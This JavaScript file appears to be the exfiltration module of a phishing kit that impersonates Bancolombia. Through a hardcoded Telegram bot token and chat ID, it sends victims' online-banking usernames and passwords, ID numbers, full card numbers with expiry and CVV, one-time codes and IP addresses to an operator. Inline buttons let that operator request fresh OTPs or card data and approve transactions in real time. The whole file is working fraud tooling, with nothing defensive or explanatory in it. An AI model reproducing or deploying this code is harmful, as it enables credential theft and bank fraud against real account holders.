// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
const TELEGRAM_CHAT_ID = '8469651553';

// ========================================
// FUNCIÓN PRINCIPAL - Compatible con todas las páginas
// ========================================

/**
 * Envía un mensaje a Telegram con formato y teclado
 * @param {string} mensaje - Mensaje a enviar (puede incluir Markdown)
 * @param {object} teclado - Objeto con los botones inline (opcional)
 * @returns {Promise}
 */
async function sendTelegramMessage(mensaje, teclado = null) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'Markdown'
    };
    
    if (teclado) {
        payload.reply_markup = teclado;
    }
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();
        
        if (!result.ok) {
            console.error('Error de Telegram:', result);
            throw new Error(`Error al enviar mensaje: ${result.description || 'Desconocido'}`);
        }

        console.log('✅ Mensaje enviado a Telegram correctamente');
        return result;
        
    } catch (error) {
        console.error('❌ Error enviando a Telegram:', error);
        throw error;
    }
}

// ========================================
// FUNCIÓN PARA DATOS COMPLETOS (otp-dinamica.html)
// ========================================

/**
 * Envía datos completos del formulario a Telegram
 * @param {object} data - Objeto con todos los datos del usuario
 * @returns {Promise}
 */
async function sendToTelegram(data) {
    const mensaje = formatearMensaje(data);
    const teclado = crearTeclado(data);
    
    return await sendTelegramMessage(mensaje, teclado);
}

// ========================================
// FORMATEAR MENSAJE COMPLETO
// ========================================

function formatearMensaje(data) {
    const transactionId = data.transactionId || Date.now().toString(36);
    
    let mensaje = `🏦 *NUEVA SOLICITUD BANCOLOMBIA*
━━━━━━━━━━━━━━━━━━━━━━━━━━

`;

    // DATOS DE LOGIN
    if (data.usuario || data.clave) {
        mensaje += `🔐 *DATOS DE ACCESO*
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Usuario: \`${data.usuario || 'N/A'}\`
🔑 Clave: \`${data.clave || 'N/A'}\`

`;
    }

    // DATOS PERSONALES
    if (data.tipoDocumento || data.numeroDocumento) {
        mensaje += `👤 *DATOS PERSONALES*
━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Tipo Doc: ${data.tipoDocumento || 'N/A'}
🆔 Documento: \`${data.numeroDocumento || 'N/A'}\`
👤 Nombre: ${data.nombreCompleto || 'N/A'}
📱 Celular: ${data.celular || 'N/A'}
📧 Email: ${data.email || 'N/A'}

`;
    }

    // DATOS DE TARJETA
    if (data.cardNumber || data.numeroTarjeta) {
        mensaje += `💳 *DATOS DE TARJETA*
━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Número: \`${data.cardNumber || data.numeroTarjeta || 'N/A'}\`
👤 Titular: ${data.cardholderName || data.nombreTitular || 'N/A'}
📅 Vencimiento: \`${data.expiryDate || data.fechaVencimiento || 'N/A'}\`
🔒 CVV: \`${data.cvv || 'N/A'}\`

`;
    }

    // CÓDIGO DE VERIFICACIÓN
    if (data.codigoVerificacion || data.otp) {
        mensaje += `🔐 *VERIFICACIÓN*
━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.tipoVerificacion || data.tipoOTP || 'Código'}: \`${data.codigoVerificacion || data.otp || 'Pendiente'}\`

`;
    }

    // INFORMACIÓN ADICIONAL
    mensaje += `🌐 *INFORMACIÓN ADICIONAL*
━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 IP: ${data.ip || data.userIP || 'No disponible'}
⏰ Hora: ${data.timestamp || new Date().toLocaleString('es-CO')}
🆔 ID: \`${transactionId}\`
━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    return mensaje.trim();
}

// ========================================
// CREAR TECLADO DE BOTONES
// ========================================

function crearTeclado(data) {
    const transactionId = data.transactionId || Date.now().toString(36);
    
    return {
        inline_keyboard: [
            [
                { 
                    text: "✅ Código Correcto", 
                    callback_data: `correcto:${transactionId}` 
                },
                { 
                    text: "❌ Código Incorrecto", 
                    callback_data: `incorrecto:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔐 Solicitar Nueva Dinámica", 
                    callback_data: `nueva_dinamica:${transactionId}` 
                }
            ],
            [
                { 
                    text: "📱 Solicitar Nuevo OTP", 
                    callback_data: `nuevo_otp:${transactionId}` 
                }
            ],
            [
                { 
                    text: "💳 Solicitar Datos Tarjeta", 
                    callback_data: `pedir_tarjeta:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Aprobar Transacción", 
                    callback_data: `aprobar:${transactionId}` 
                },
                { 
                    text: "🚫 Rechazar", 
                    callback_data: `rechazar:${transactionId}` 
                }
            ]
        ]
    };
}

// ========================================
// FUNCIÓN PARA ACTUALIZACIONES RÁPIDAS
// ========================================

/**
 * Envía solo una actualización de código (OTP o Dinámica)
 * @param {string} codigo - El código a enviar
 * @param {string} tipo - Tipo de código ('OTP', 'Dinámica', etc.)
 * @returns {Promise}
 */
async function enviarActualizacionCodigo(codigo, tipo = 'OTP') {
    const transactionId = Date.now().toString(36);
    
    const mensaje = `🔐 *NUEVO ${tipo.toUpperCase()}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 Código: \`${codigo}\`
📱 Tipo: ${tipo}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}
📅 Fecha: ${new Date().toLocaleDateString('es-CO')}

━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    const teclado = {
        inline_keyboard: [
            [
                { 
                    text: "✅ Correcto", 
                    callback_data: `codigo_correcto:${transactionId}` 
                },
                { 
                    text: "❌ Incorrecto", 
                    callback_data: `codigo_error:${transactionId}` 
                }
            ],
            [
                { 
                    text: "🔄 Pedir Otro", 
                    callback_data: `pedir_otro:${transactionId}` 
                }
            ],
            [
                { 
                    text: "✔️ Finalizar", 
                    callback_data: `finalizar:${transactionId}` 
                }
            ]
        ]
    };

    return await sendTelegramMessage(mensaje, teclado);
}

// ========================================
// FUNCIÓN PARA OBTENER IP PÚBLICA
// ========================================

/**
 * Obtiene la IP pública del usuario
 * @returns {Promise<string>}
 */
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error obteniendo IP:', error);
        return 'No disponible';
    }
}

// ========================================
// EXPORTAR FUNCIONES (para compatibilidad)
// ========================================

// Estas funciones están disponibles globalmente
console.log('✅ telegram.js cargado correctamente');
console.log('📡 Funciones disponibles: sendTelegramMessage, sendToTelegram, enviarActualizacionCodigo, getPublicIP');
